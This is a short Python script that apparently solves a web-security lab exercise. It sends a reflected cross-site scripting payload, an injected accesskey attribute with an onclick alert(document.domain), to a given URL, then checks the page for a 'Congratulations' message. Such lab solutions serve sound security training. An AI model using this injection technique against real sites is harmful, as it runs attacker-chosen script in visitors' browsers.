import requests
import urllib3
from sys import argv

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_website_url():
    if len(argv) != 2:
        print(f"[+] usage {argv[0]} <url>")
        print(f"[+] example {argv[0]} 'http://example.com'")
        exit(-1)

    if argv[1][-1] == '/':
        url = argv[1][:-1]
    else:
        url = argv[1]

    return url

def attack(url): 
    print("[+] Starting attack")
    xss_payload = "/?'%09accesskey='x'%09onclick='alert(document.domain)"

    print(f"[+] sending xss payload : {xss_payload}")

    r = requests.get(url + xss_payload)

    r = requests.get(url)
    if 'Congratulations' in r.text:
        print("[+] attack successfully")
    else:
        print("[-] Attack un successfully")

attack(get_website_url())
